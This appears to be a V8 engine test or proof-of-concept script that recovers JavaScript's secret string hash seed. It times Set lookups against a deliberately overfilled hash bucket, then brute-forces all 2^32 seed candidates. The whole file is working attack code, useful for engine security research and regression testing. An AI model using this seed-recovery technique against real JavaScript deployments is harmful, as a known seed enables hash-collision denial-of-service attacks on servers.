'use strict';
function run_repeated(n, fn) {
  const res = [];
  for (let i = 0; i < n; i++) res.push(fn());
  return res;
}

const INT_MAX = 0x7fffffff;

// from src/js/collection.js
// key must be a signed 32-bit number!
function ComputeIntegerHash(key/*, seed*/) {
  let hash = key;
  hash = hash ^ 0/*seed*/;
  hash = ~hash + (hash << 15);  // hash = (hash << 15) - hash - 1;
  hash = hash ^ (hash >>> 12);
  hash = hash + (hash << 2);
  hash = hash ^ (hash >>> 4);
  hash = (hash * 2057) | 0;  // hash = (hash + (hash << 3)) + (hash << 11);
  hash = hash ^ (hash >>> 16);
  return hash & 0x3fffffff;
}

const kNofHashBitFields = 2;
const kHashShift = kNofHashBitFields;
const kHashBitMask = 0xffffffff >>> kHashShift;
const kZeroHash = 27;

function string_to_array(str) {
  const res = new Array(str.length);
  for (let i = 0; i < str.length; i++) {
    res[i] = str.charCodeAt(i);
  }
  return res;
}

function gen_specialized_hasher(str) {
  const str_arr = string_to_array(str);
  return Function('seed', `
    var running_hash = seed;
    ${str_arr.map((c) => `
      running_hash += ${c};
      running_hash &= 0xffffffff;
      running_hash += (running_hash << 10);
      running_hash &= 0xffffffff;
      running_hash ^= (running_hash >>> 6);
      running_hash &= 0xffffffff;
    `).join('')}
    running_hash += (running_hash << 3);
    running_hash &= 0xffffffff;
    running_hash ^= (running_hash >>> 11);
    running_hash &= 0xffffffff;
    running_hash += (running_hash << 15);
    running_hash &= 0xffffffff;
    if ((running_hash & ${kHashBitMask}) == 0) {
      return ${kZeroHash};
    }
    return running_hash;
  `);
}

// adapted from HashToEntry
function hash_to_bucket(hash, numBuckets) {
  return (hash & ((numBuckets) - 1));
}

function time_set_lookup(set, value) {
  const t1 = process.hrtime();
  for (let i = 0; i < 100; i++) {
    set.has(value);
  }
  const t = process.hrtime(t1);
  const secs = t[0];
  const nanos = t[1];
  return secs * 1e9 + nanos;
}

// Prevent optimization of SetHas().
%NeverOptimizeFunction(time_set_lookup);

// Set with 256 buckets; bucket 0 full, others empty
const tester_set_buckets = 256;
const tester_set = new Set();
let tester_set_threshold;
(function() {
  // fill bucket 0 and find extra numbers mapping to bucket 0 and a different
  // bucket `capacity == numBuckets * 2`
  let needed = Math.floor(tester_set_buckets * 1.5) + 1;
  let positive_test_value;
  let negative_test_value;
  for (let i = 0; true; i++) {
    if (i > INT_MAX) throw new Error('i too high');
    if (hash_to_bucket(ComputeIntegerHash(i), tester_set_buckets) !== 0) {
      negative_test_value = i;
      break;
    }
  }
  for (let i = 0; needed > 0; i++) {
    if (i > INT_MAX) throw new Error('i too high');
    if (hash_to_bucket(ComputeIntegerHash(i), tester_set_buckets) === 0) {
      needed--;
      if (needed == 0) {
        positive_test_value = i;
      } else {
        tester_set.add(i);
      }
    }
  }

  // calibrate Set access times for accessing the full bucket / an empty bucket
  const pos_time =
    Math.min(...run_repeated(10000, time_set_lookup.bind(null, tester_set,
                                                         positive_test_value)));
  const neg_time =
    Math.min(...run_repeated(10000, time_set_lookup.bind(null, tester_set,
                                                         negative_test_value)));
  tester_set_threshold = (pos_time + neg_time) / 2;
  // console.log(`pos_time: ${pos_time}, neg_time: ${neg_time},`,
  //             `threshold: ${tester_set_threshold}`);
})();

// determine hash seed
const slow_str_gen = (function*() {
  let strgen_i = 0;
  outer:
  while (1) {
    const str = `#${strgen_i++}`;
    for (let i = 0; i < 1000; i++) {
      if (time_set_lookup(tester_set, str) < tester_set_threshold)
        continue outer;
    }
    yield str;
  }
})();

const first_slow_str = slow_str_gen.next().value;
// console.log('first slow string:', first_slow_str);
const first_slow_str_special_hasher = gen_specialized_hasher(first_slow_str);
let seed_candidates = [];
//var t_before_first_seed_brute = performance.now();
for (let seed_candidate = 0; seed_candidate < 0x100000000; seed_candidate++) {
  if (hash_to_bucket(first_slow_str_special_hasher(seed_candidate),
                     tester_set_buckets) == 0) {
    seed_candidates.push(seed_candidate);
  }
}
// console.log(`got ${seed_candidates.length} candidates`);
//  after ${performance.now()-t_before_first_seed_brute}
while (seed_candidates.length > 1) {
  const slow_str = slow_str_gen.next().value;
  const special_hasher = gen_specialized_hasher(slow_str);
  const new_seed_candidates = [];
  for (const seed_candidate of seed_candidates) {
    if (hash_to_bucket(special_hasher(seed_candidate), tester_set_buckets) ==
        0) {
      new_seed_candidates.push(seed_candidate);
    }
  }
  seed_candidates = new_seed_candidates;
  // console.log(`reduced to ${seed_candidates.length} candidates`);
}
if (seed_candidates.length != 1)
  throw new Error('no candidates remaining');
const seed = seed_candidates[0];
console.log(seed);
